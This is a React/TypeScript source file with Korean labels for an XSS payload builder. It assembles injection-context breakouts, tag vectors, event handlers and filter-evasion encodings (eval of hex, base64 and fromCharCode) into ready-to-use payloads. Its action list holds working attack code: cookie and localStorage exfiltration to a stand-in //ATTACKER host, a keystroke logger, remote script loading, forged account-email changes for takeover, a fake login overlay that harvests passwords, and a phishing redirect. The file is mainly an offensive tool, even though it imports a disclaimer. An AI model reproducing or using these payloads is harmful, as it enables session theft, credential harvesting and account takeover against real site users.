import { useState } from 'react'
import {
  DISCLAIMER, Note, Pick, TextInput, Readout,
  jsStringConcat, hexEscape, unicodeEscape, base64Encode,
  htmlEntityDecimal, htmlEntityHex, urlEncodeAll,
} from './shared'

/* ── 1. 삽입 위치(컨텍스트) ────────────────────────────────────────
   각 컨텍스트는 벡터 앞에 붙일 breakout 접두사와, 벡터가 아니라
   순수 JS 코드를 요구하는지(rawCode) 를 정의한다. */
type Ctx = {
  id: string
  label: string
  /** 태그 벡터 앞에 붙는 컨텍스트 탈출 문자열 */
  prefix: string
  /** 태그 벡터 뒤에 붙는 마무리(주석 처리 등) */
  suffix?: string
  /** true면 태그/이벤트 대신 JS 코드 자체를 감싼다 */
  rawCode?: (code: string) => string
  /** srcdoc 처럼 결과 전체를 HTML 엔티티로 인코딩해야 하는 경우 */
  entityEncodeResult?: boolean
  hint: string
}

const CONTEXTS: Ctx[] = [
  { id: 'html-text', label: 'HTML 본문 텍스트', prefix: '', hint: '반사 값이 태그 사이 텍스트로 들어갈 때. 태그를 그대로 삽입.' },
  { id: 'attr-dq', label: 'HTML 속성값 (큰따옴표)', prefix: '">', hint: 'value="…HERE…" 형태. "> 로 속성과 태그를 닫고 새 태그 삽입.' },
  { id: 'attr-sq', label: 'HTML 속성값 (작은따옴표)', prefix: "'>", hint: "value='…HERE…' 형태. '> 로 닫고 새 태그 삽입." },
  { id: 'attr-unquoted', label: 'HTML 속성값 (따옴표 없음)', prefix: ' ', suffix: '', hint: 'value=…HERE… 형태. 공백으로 새 속성을 붙여 같은 태그에 이벤트 주입.' },
  { id: 'html-comment', label: 'HTML 주석 내부', prefix: '--><', suffix: '<!--', hint: '<!-- …HERE… --> 안. --> 로 주석을 탈출.' },
  { id: 'js-str-dq', label: 'JS 문자열 (큰따옴표)', prefix: '', rawCode: c => `";${c};//`, hint: 'var x = "…HERE…" 안. " 로 문자열을 닫고 구문 주입 후 // 로 잔여 무효화.' },
  { id: 'js-str-sq', label: 'JS 문자열 (작은따옴표)', prefix: '', rawCode: c => `';${c};//`, hint: "var x = '…HERE…' 안." },
  { id: 'js-template', label: 'JS 템플릿 리터럴', prefix: '', rawCode: c => '${' + c + '}', hint: '`…HERE…` 안. ${ } 치환식으로 즉시 실행.' },
  { id: 'js-block', label: 'JS 코드 컨텍스트 (이미 <script> 안)', prefix: '', rawCode: c => c, hint: '반사 값이 스크립트 블록에 그대로 들어갈 때. 코드를 그대로.' },
  { id: 'js-uri', label: 'href / src 속성 (javascript: URI)', prefix: '', rawCode: c => `javascript:${c}`, hint: '<a href="…HERE…"> 처럼 URL 을 받는 속성. 사용자 클릭/네비게이션 시 실행.' },
  { id: 'srcdoc', label: 'iframe srcdoc 속성', prefix: '">', entityEncodeResult: true, hint: 'srcdoc 은 HTML 을 엔티티 인코딩해서 담아야 파서를 통과한다.' },
  { id: 'style', label: 'style 속성 / <style> 블록', prefix: '</style><', suffix: '<style>', hint: '</style> 로 CSS 컨텍스트를 탈출해 새 태그 삽입.' },
  { id: 'json-html', label: 'JSON 응답이 HTML 로 반사', prefix: '</script><', suffix: '<script>', hint: '<script> 안 JSON 문자열. </script> 로 스크립트 블록을 조기 종료.' },
]

/* ── 2. 벡터(태그) ──────────────────────────────────────────────── */
type Vector = {
  id: string
  label: string
  /** noEvent: 이벤트 핸들러 없이 자체 실행 */
  noEvent?: boolean
  build: (event: string, code: string) => string
}

const VECTORS: Vector[] = [
  { id: 'img', label: 'img onerror', build: (e, c) => `<img src=x ${e}=${c}>` },
  { id: 'svg', label: 'svg onload', build: (e, c) => `<svg ${e}=${c}>` },
  { id: 'svg-anim', label: 'svg + animate (onbegin)', build: (_e, c) => `<svg><animate onbegin=${c} attributeName=x dur=1s>` },
  { id: 'body', label: 'body onload', build: (e, c) => `<body ${e}=${c}>` },
  { id: 'iframe', label: 'iframe onload / src', build: (e, c) => `<iframe src=x ${e}=${c}></iframe>` },
  { id: 'iframe-srcdoc', label: 'iframe srcdoc', noEvent: true, build: (_e, c) => `<iframe srcdoc="<script>${c}</script>"></iframe>` },
  { id: 'input', label: 'input autofocus onfocus', build: (e, c) => `<input autofocus ${e}=${c}>` },
  { id: 'select', label: 'select autofocus', build: (e, c) => `<select autofocus ${e}=${c}></select>` },
  { id: 'textarea', label: 'textarea autofocus', build: (e, c) => `<textarea autofocus ${e}=${c}></textarea>` },
  { id: 'details', label: 'details ontoggle', build: (e, c) => `<details open ${e}=${c}></details>` },
  { id: 'marquee', label: 'marquee onstart', build: (e, c) => `<marquee ${e}=${c}>` },
  { id: 'video', label: 'video onerror', build: (e, c) => `<video ${e}=${c}><source src=x></video>` },
  { id: 'audio', label: 'audio onerror', build: (e, c) => `<audio src=x ${e}=${c}>` },
  { id: 'object', label: 'object data', noEvent: true, build: (_e, c) => `<object data="javascript:${c}"></object>` },
  { id: 'form-button', label: 'form + button formaction', noEvent: true, build: (_e, c) => `<form><button formaction="javascript:${c}">X</button></form>` },
  { id: 'a-href', label: 'a href javascript:', noEvent: true, build: (_e, c) => `<a href="javascript:${c}">클릭</a>` },
  { id: 'script', label: 'script (인라인 직접 실행)', noEvent: true, build: (_e, c) => `<script>${c}</script>` },
  { id: 'script-src', label: 'script src (원격 로드)', noEvent: true, build: (_e, c) => `<script src="${c}"></script>` },
  { id: 'meta-refresh', label: 'meta refresh javascript:', noEvent: true, build: (_e, c) => `<meta http-equiv="refresh" content="0;url=javascript:${c}">` },
  { id: 'base', label: 'base href (스크립트 하이재킹)', noEvent: true, build: (_e, _c) => `<base href="//ATTACKER/">` },
  { id: 'dangling', label: 'dangling markup (마크업 누수)', noEvent: true, build: (_e, _c) => `<img src="//ATTACKER/?leak=` },
  { id: 'style-import', label: 'style @import (CSS 유출)', noEvent: true, build: (_e, _c) => `<style>@import "//ATTACKER/x.css";</style>` },
]

const EVENTS = [
  'onerror', 'onload', 'onfocus', 'ontoggle', 'onstart', 'onclick', 'onmouseover',
  'onmouseenter', 'onpointerover', 'onwheel', 'onanimationstart', 'ontransitionend',
]

/* ── 3. 실행 코드 종류 ──────────────────────────────────────────── */
type Action = { id: string; label: string; needs?: 'url' | 'code' | 'path'; build: (v: { url: string; code: string; path: string }) => string }

const ACTIONS: Action[] = [
  { id: 'alert1', label: 'alert(1) — 반사 확인', build: () => 'alert(1)' },
  { id: 'alert-domain', label: 'alert(document.domain) — 실행 오리진 확인', build: () => 'alert(document.domain)' },
  { id: 'alert-cookie', label: 'alert(document.cookie)', build: () => 'alert(document.cookie)' },
  { id: 'print', label: 'print() — 팝업 차단 무관', build: () => 'print()' },
  {
    id: 'cookie-img', label: '쿠키 유출 — Image 픽셀', needs: 'url',
    build: v => `new Image().src='${v.url || '//ATTACKER'}/?c='+encodeURIComponent(document.cookie)`,
  },
  {
    id: 'cookie-beacon', label: '쿠키 유출 — sendBeacon (언로드에도 전송)', needs: 'url',
    build: v => `navigator.sendBeacon('${v.url || '//ATTACKER'}/c',document.cookie)`,
  },
  {
    id: 'storage-exfil', label: 'localStorage+sessionStorage 유출 — fetch POST', needs: 'url',
    build: v => `fetch('${v.url || '//ATTACKER'}/s',{method:'POST',body:JSON.stringify({l:localStorage,s:sessionStorage,u:location.href})})`,
  },
  {
    id: 'dom-exfil', label: '현재 페이지 DOM 유출 (앞 4KB)', needs: 'url',
    build: v => `fetch('${v.url || '//ATTACKER'}/d',{method:'POST',body:document.documentElement.outerHTML.slice(0,4096)})`,
  },
  {
    id: 'remote-script', label: '원격 스크립트 로드 — import()', needs: 'url',
    build: v => `import('${v.url || '//ATTACKER'}/x.js')`,
  },
  {
    id: 'remote-append', label: '원격 스크립트 로드 — script 태그 주입', needs: 'url',
    build: v => `s=document.createElement('script');s.src='${v.url || '//ATTACKER'}/x.js';document.head.append(s)`,
  },
  {
    id: 'keylogger', label: '키로거 — 입력을 배치 전송', needs: 'url',
    build: v => `k='';onkeydown=e=>{k+=e.key;if(k.length>20){navigator.sendBeacon('${v.url || '//ATTACKER'}/k',k);k=''}}`,
  },
  {
    id: 'csrf-ride', label: '세션 라이딩 — 인증된 상태로 상태변경 요청', needs: 'path',
    build: v => `fetch('${v.path || '/api/ENDPOINT'}',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{}'})`,
  },
  {
    id: 'account-takeover', label: '이메일/비밀번호 변경 요청 (계정 탈취)', needs: 'path',
    build: v => `fetch('${v.path || '/api/account'}',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.tld'})})`,
  },
  {
    id: 'cred-overlay', label: '가짜 로그인 폼 오버레이 (자격증명 수집)', needs: 'url',
    build: v => `d=document.body.appendChild(document.createElement('form'));d.innerHTML='<div style=position:fixed;inset:0;background:#fff;z-index:9999;padding:20vh>세션이 만료되었습니다<br><input name=u placeholder=ID><input name=p type=password><button>로그인</button></div>';d.onsubmit=e=>{e.preventDefault();navigator.sendBeacon('${v.url || '//ATTACKER'}/f',new URLSearchParams(new FormData(d)))}`,
  },
  {
    id: 'redirect', label: '피싱 사이트로 리다이렉트', needs: 'url',
    build: v => `location='${v.url || '//ATTACKER'}'`,
  },
  { id: 'custom', label: '커스텀 JS 코드 직접 입력', needs: 'code', build: v => v.code || 'alert(1)' },
]

/* ── 4. 우회 기법 ──────────────────────────────────────────────── */
type Bypass = { id: string; label: string; apply: (code: string) => string; hint?: string }

const BYPASSES: Bypass[] = [
  { id: 'none', label: '없음', apply: c => c },
  { id: 'concat', label: '문자열 분리 후 eval', apply: c => `eval(${jsStringConcat(c)})`, hint: "'ale'+'rt(1)' 처럼 조각내 시그니처 탐지 우회" },
  { id: 'hex', label: 'eval(hex 문자열)', apply: c => `eval("${hexEscape(c)}")` },
  { id: 'unicode', label: 'eval(유니코드 이스케이프)', apply: c => `eval("${unicodeEscape(c)}")` },
  { id: 'b64', label: 'eval(atob(base64))', apply: c => `eval(atob("${base64Encode(c)}"))` },
  { id: 'fromcharcode', label: 'String.fromCharCode', apply: c => `eval(String.fromCharCode(${Array.from(c).map(ch => ch.charCodeAt(0)).join(',')}))` },
  { id: 'backtick', label: '괄호 없이 백틱 호출', apply: c => c.replace(/^(\w+)\((.*)\)$/, '$1`$2`'), hint: 'alert`1` — 괄호 필터 우회 (인자 1개 함수만)' },
  { id: 'settimeout', label: 'setTimeout 문자열 실행', apply: c => `setTimeout('${c.replace(/'/g, "\\'")}')` },
  { id: 'comment', label: 'JS 주석 삽입', apply: c => c.replace(/\(/, '/**/(' ), hint: 'al/**/ert(1) 스타일 토큰 분리' },
]

const OUTPUT_TRANSFORMS: { id: string; label: string; apply: (s: string) => string }[] = [
  { id: 'raw', label: '원문 (Raw)', apply: s => s },
  { id: 'url', label: 'URL 인코딩', apply: s => encodeURIComponent(s) },
  { id: 'url-all', label: 'URL 인코딩 (전체 바이트)', apply: urlEncodeAll },
  { id: 'url-double', label: 'URL 이중 인코딩', apply: s => encodeURIComponent(encodeURIComponent(s)) },
  { id: 'entity-dec', label: 'HTML 엔티티 (10진)', apply: htmlEntityDecimal },
  { id: 'entity-hex', label: 'HTML 엔티티 (16진)', apply: htmlEntityHex },
]

export function XssPayloadBuilder() {
  const [ctxId, setCtxId] = useState('html-text')
  const [vectorId, setVectorId] = useState('img')
  const [event, setEvent] = useState('onerror')
  const [actionId, setActionId] = useState('alert1')
  const [bypassId, setBypassId] = useState('none')
  const [url, setUrl] = useState('')
  const [code, setCode] = useState('')
  const [path, setPath] = useState('')

  const ctx = CONTEXTS.find(c => c.id === ctxId)!
  const vector = VECTORS.find(v => v.id === vectorId)!
  const action = ACTIONS.find(a => a.id === actionId)!
  const bypass = BYPASSES.find(b => b.id === bypassId)!

  // 1) 실행 코드
  let js = action.build({ url, code, path })
  // 2) 우회 기법 적용
  js = bypass.apply(js)

  // 3) 컨텍스트별 조립
  let assembled: string
  if (ctx.rawCode) {
    assembled = ctx.prefix + ctx.rawCode(js)
  } else {
    const tag = vector.build(vector.noEvent ? '' : event, js)
    assembled = ctx.prefix + tag + (ctx.suffix ?? '')
  }
  if (ctx.entityEncodeResult) assembled = htmlEntityDecimal(assembled)

  const showVector = !ctx.rawCode

  return <div className="payload-builder">
    <Note>{DISCLAIMER}</Note>

    <Pick label="1. 삽입 위치 (컨텍스트)" value={ctxId} onChange={setCtxId}
      options={CONTEXTS.map(c => ({ id: c.id, label: c.label }))}/>
    <p className="payload-builder-hint">{ctx.hint}</p>

    {showVector && <>
      <Pick label="2. 벡터 (태그)" value={vectorId} onChange={setVectorId}
        options={VECTORS.map(v => ({ id: v.id, label: v.label }))}/>
      {!vector.noEvent && <Pick label="이벤트 핸들러" value={event} onChange={setEvent}
        options={EVENTS.map(e => ({ id: e, label: e }))}/>}
    </>}

    <Pick label="3. 실행 코드" value={actionId} onChange={setActionId}
      options={ACTIONS.map(a => ({ id: a.id, label: a.label }))}/>
    {action.needs === 'url' && <TextInput label="수집 서버 (내가 관리하는 도메인)" value={url} onChange={setUrl} placeholder="//attacker.example"/>}
    {action.needs === 'path' && <TextInput label="대상 엔드포인트 경로" value={path} onChange={setPath} placeholder="/api/user/email"/>}
    {action.needs === 'code' && <TextInput label="커스텀 JS" value={code} onChange={setCode} placeholder="alert(document.domain)"/>}

    <Pick label="4. 우회 기법 (실행 코드 변형)" value={bypassId} onChange={setBypassId}
      options={BYPASSES.map(b => ({ id: b.id, label: b.label }))}/>
    {bypass.hint && <p className="payload-builder-hint">{bypass.hint}</p>}

    <div className="payload-readout-group">
      {OUTPUT_TRANSFORMS.map(t => <Readout key={t.id} title={t.label} value={t.apply(assembled)} wrap="anywhere"/>)}
    </div>
  </div>
}
